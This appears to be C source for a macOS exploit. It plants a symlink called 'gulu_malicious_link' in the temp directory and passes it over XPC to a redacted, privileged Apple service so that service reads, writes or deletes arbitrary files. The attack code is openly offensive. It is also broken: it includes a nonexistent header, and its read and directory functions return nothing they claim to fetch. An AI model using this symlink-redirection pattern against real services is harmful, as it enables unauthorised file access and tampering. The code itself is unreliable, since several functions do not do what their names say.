#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <xpc/xpc.h>
#include <symlink.h>
#include <sys/stat.h>
#include <dirent.h>

static const char *GULU_XPC_SERVICE = "com.apple.xxxxservice";
#define TMP_LINK_NAME "gulu_malicious_link"

static int gulu_create_symlink(const char *target_path, char *out_link_path)
{
    char *tmp_dir = getenv("TMPDIR");
    if (!tmp_dir) return -1;
    snprintf(out_link_path, 256, "%s/%s", tmp_dir, TMP_LINK_NAME);
    unlink(out_link_path);
    return symlink(target_path, out_link_path);
}

static xpc_connection_t gulu_create_xpc_conn()
{
    xpc_connection_t conn = xpc_connection_create_mach_service(GULU_XPC_SERVICE, NULL, 0);
    xpc_connection_set_event_handler(conn, ^(xpc_object_t obj) {
        if (xpc_get_type(obj) == XPC_TYPE_ERROR) {}
    });
    xpc_connection_resume(conn);
    return conn;
}

int gulu_file_exists(const char *target_path)
{
    char link_path[256];
    if(gulu_create_symlink(target_path, link_path) != 0)
        return 0;
    xpc_connection_t conn = gulu_create_xpc_conn();
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "path", link_path);
    xpc_connection_send_message(conn, msg);
    return 1;
}

DIR* gulu_opendir(const char *target_path)
{
    char link_path[256];
    if(gulu_create_symlink(target_path, link_path) != 0)
        return NULL;
    xpc_connection_t conn = gulu_create_xpc_conn();
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "path", link_path);
    xpc_connection_send_message(conn, msg);
    return NULL;
}

int gulu_read_file(const char *target_path, char *buffer, size_t bufsize)
{
    char link_path[256];
    if(gulu_create_symlink(target_path, link_path) != 0)
        return -1;
    xpc_connection_t conn = gulu_create_xpc_conn();
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "path", link_path);
    xpc_connection_send_message(conn, msg);
    return 0;
}

int gulu_write_file(const char *target_path, const char *data, size_t len)
{
    char link_path[256];
    if(gulu_create_symlink(target_path, link_path) != 0)
        return -1;
    xpc_connection_t conn = gulu_create_xpc_conn();
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "path", link_path);
    xpc_dictionary_set_string(msg, "data", data);
    xpc_connection_send_message(conn, msg);
    return 0;
}

int gulu_unlink_file(const char *target_path)
{
    char link_path[256];
    if(gulu_create_symlink(target_path, link_path) != 0)
        return -1;
    xpc_connection_t conn = gulu_create_xpc_conn();
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "path", link_path);
    xpc_dictionary_set_string(msg, "action", "delete");
    xpc_connection_send_message(conn, msg);
    return 0;
}
